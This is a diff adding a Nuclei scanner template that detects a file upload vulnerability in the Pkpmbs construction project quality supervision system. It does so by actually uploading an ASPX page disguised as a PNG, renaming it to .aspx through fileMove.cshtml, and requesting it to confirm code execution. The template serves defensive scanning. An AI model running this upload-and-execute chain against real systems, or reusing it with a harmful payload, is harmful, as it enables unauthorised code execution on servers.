@@ -1,0 +1,86 @@
+id: pkpmbs-fileupload-vulnerability
+info:
+  name: Pkpmbs File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The Pkpmbs construction project quality supervision system contains a file upload vulnerability allowing attackers to upload malicious files that may lead to arbitrary code execution or backdoor installation.
+    This template detects the vulnerability by simulating the file upload and confirming the uploaded file's presence.
+  reference:
+    - http://www.hunanjianyan.com/product/detail/16.html
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: login-page
+    method: GET
+    path:
+      - "{{BaseURL}}/Login.cshtml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: session_id
+        internal: true
+        group: 1
+        regex:
+          - "ASP.NET_SessionId=(.*?);"
+
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/Platform/System/FileUpload.ashx"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP
+    body: |
+      ------WebKitFormBoundarybqACRhAMBHmQQAUP
+      Content-Disposition: form-data; name="file"; filename="test.png"
+      Content-Type: image/png
+
+      e165421110ba03099a1c0393373c5b43
+      <%@ Page Language="C#" Debug="true" %>
+      <%@ import Namespace="System"%>
+      <%@ import Namespace="System.IO"%>
+      <% string pageName = Request.PhysicalPath;%>
+      <% File.Delete(pageName);%>
+      ------WebKitFormBoundarybqACRhAMBHmQQAUP
+      Content-Disposition: form-data; name="target"
+
+      /Applications/SkillDevelopAndEHS/
+      ------WebKitFormBoundarybqACRhAMBHmQQAUP--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "上传成功"
+
+  - id: move-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Applications/SkillDevelopAndEHS/fileMove.cshtml?filePath=test.png&factFilePath=test.aspx"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: validate-uploaded-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Applications/SkillDevelopAndEHS/test.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
